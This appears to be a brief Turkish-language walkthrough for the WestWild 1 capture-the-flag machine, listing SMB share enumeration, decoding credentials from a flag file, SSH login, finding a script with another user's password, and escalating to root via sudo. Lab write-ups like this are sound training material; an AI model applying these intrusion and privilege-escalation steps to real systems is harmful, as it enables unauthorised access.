@@ -1,0 +1,8 @@
+WESTWILD 1 MAKINE ÇÖZÜMÜ
+1 - IP adresi 192.168.2.66 makine ekranında yaziyor.
+2 - smbclient -L //192.168.2.66, smbclient //192.168.2.66/wave
+3 - cat FLAG1.txt, base64 decode, wavex:door+open
+4 - ssh wavex@192.168.2.66
+5 - find / -type d -name "*west*" 2>/dev/null
+6 - cat /usr/share/av/westsidesecret/ififoregt.sh, aveng:kaizen+80
+7 - su aveng, sudo  -l, sudo su
